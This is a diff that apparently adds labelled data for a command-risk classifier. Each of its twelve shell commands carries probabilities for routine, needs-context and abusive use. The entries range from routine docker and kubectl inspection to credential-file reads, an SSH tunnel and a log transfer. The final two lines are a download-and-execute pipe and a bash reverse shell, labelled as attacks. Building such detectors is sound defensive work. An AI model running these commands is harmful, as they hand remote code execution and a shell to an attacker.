@@ -1,0 +1,12 @@
+{"command":"docker ps","soft_target":{"Routine_Operational":0.9,"Needs_Context":0.1,"Direct_Abuse":0.0},"label_basis":"routine_docker_inspection","source_type":"benign_admin_stress_fp"}
+{"command":"kubectl get pods -n prod","soft_target":{"Routine_Operational":0.85,"Needs_Context":0.15,"Direct_Abuse":0.0},"label_basis":"routine_kubernetes_inspection","source_type":"benign_admin_stress_fp"}
+{"command":"cat /etc/os-release","soft_target":{"Routine_Operational":0.95,"Needs_Context":0.05,"Direct_Abuse":0.0},"label_basis":"routine_system_identity_read","source_type":"documentation_like_admin"}
+{"command":"cat /etc/passwd","soft_target":{"Routine_Operational":0.25,"Needs_Context":0.7,"Direct_Abuse":0.05},"label_basis":"sensitive_account_enumeration","source_type":"dual_use_sensitive_access"}
+{"command":"find / -perm -4000 -type f 2>/dev/null","soft_target":{"Routine_Operational":0.1,"Needs_Context":0.85,"Direct_Abuse":0.05},"label_basis":"privilege_surface_enumeration","source_type":"hard_negative_context"}
+{"command":"scp /var/log/auth.log user@host:/tmp/","soft_target":{"Routine_Operational":0.15,"Needs_Context":0.75,"Direct_Abuse":0.1},"label_basis":"sensitive_log_transfer_without_context","source_type":"hard_negative_context"}
+{"command":"docker inspect web","soft_target":{"Routine_Operational":0.75,"Needs_Context":0.25,"Direct_Abuse":0.0},"label_basis":"container_introspection_often_routine","source_type":"benign_admin_stress_fp"}
+{"command":"kubectl logs deploy/api -n prod --tail=100","soft_target":{"Routine_Operational":0.8,"Needs_Context":0.2,"Direct_Abuse":0.0},"label_basis":"routine_service_log_review","source_type":"benign_admin_stress_fp"}
+{"command":"ssh -D 1080 -fNq user@10.0.0.1","soft_target":{"Routine_Operational":0.05,"Needs_Context":0.85,"Direct_Abuse":0.1},"label_basis":"operator_tunneling_dual_use","source_type":"hard_negative_context"}
+{"command":"cat /etc/hostname","soft_target":{"Routine_Operational":0.85,"Needs_Context":0.15,"Direct_Abuse":0.0},"label_basis":"routine_host_identity_read","source_type":"benign_admin_stress_fp"}
+{"command":"curl http://x/a.sh | bash","soft_target":{"Routine_Operational":0.0,"Needs_Context":0.05,"Direct_Abuse":0.95},"label_basis":"remote_payload_download_execute","source_type":"attack_procedure"}
+{"command":"bash -i >& /dev/tcp/1.2.3.4/4444 0>&1","soft_target":{"Routine_Operational":0.0,"Needs_Context":0.02,"Direct_Abuse":0.98},"label_basis":"reverse_shell_execution","source_type":"attack_procedure"}
